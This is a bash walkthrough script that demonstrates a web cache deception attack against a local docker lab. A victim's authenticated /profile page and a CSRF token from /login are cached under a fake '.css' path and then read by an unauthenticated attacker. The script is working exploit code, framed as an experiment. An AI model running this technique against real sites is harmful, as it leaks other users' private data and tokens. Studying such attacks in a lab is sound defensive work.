#!/usr/bin/env bash
# Manual WCD attack walkthrough. Run it yourself:  bash experiments/demo_attack.sh
# Requires the stack up:  docker compose up -d --build
set -u
B=${1:-http://localhost:8080}

if [ "$(curl -s -o /dev/null -w '%{http_code}' "$B/about")" != "200" ]; then
  echo "Stack not reachable at $B. Start it with: docker compose up -d --build"; exit 1
fi

hr(){ printf '\n=================================================================\n'; }
show(){ # $1 label  $2 url  $3 cookie(optional)
  local hdr cs hc
  if [ -n "${3:-}" ]; then hdr=$(curl -s -D - -o /tmp/wcd_b --cookie "$3" "$2")
  else hdr=$(curl -s -D - -o /tmp/wcd_b "$2"); fi
  cs=$(echo "$hdr" | grep -i x-cache-status | tr -d '\r' | awk '{print $2}')
  hc=$(echo "$hdr" | head -1 | awk '{print $2}')
  printf '  %-42s HTTP %s  X-Cache:%s\n' "$1" "$hc" "${cs:-none}"
  printf '      %s\n' "$(cat /tmp/wcd_b)"
}

hr; echo "1) DYNAMIC vs STATIC  (DE Step 1 signal)"
show "/profile call A" "$B/profile"; show "/profile call B" "$B/profile"
show "/about   call A" "$B/about";   show "/about   call B" "$B/about"

hr; echo "2) THE ATTACK: steal a logged-in victim's /profile via .css"
show "[victim ] /profile/hack.css" "$B/profile/hack.css" "user=VICTIM_JEFFREY"
show "[attacker] /profile/hack.css" "$B/profile/hack.css"
grep -q VICTIM_JEFFREY /tmp/wcd_b && echo "   *** LEAK: attacker (no login) got VICTIM_JEFFREY's data ***"

hr; echo "3) ESCALATION: steal a CSRF token from public /login (no marker, no login)"
show "[victim ] /login/hack.css" "$B/login/hack.css" "user=VICTIM_JEFFREY"
show "[attacker] /login/hack.css" "$B/login/hack.css"

hr; echo "4) SAFE pages resist the attack"
show "[attacker] /api/time/hack.css (404: not confusable)" "$B/api/time/hack.css"
echo "   -> nothing dynamic is ever cached here, so nothing leaks."
hr
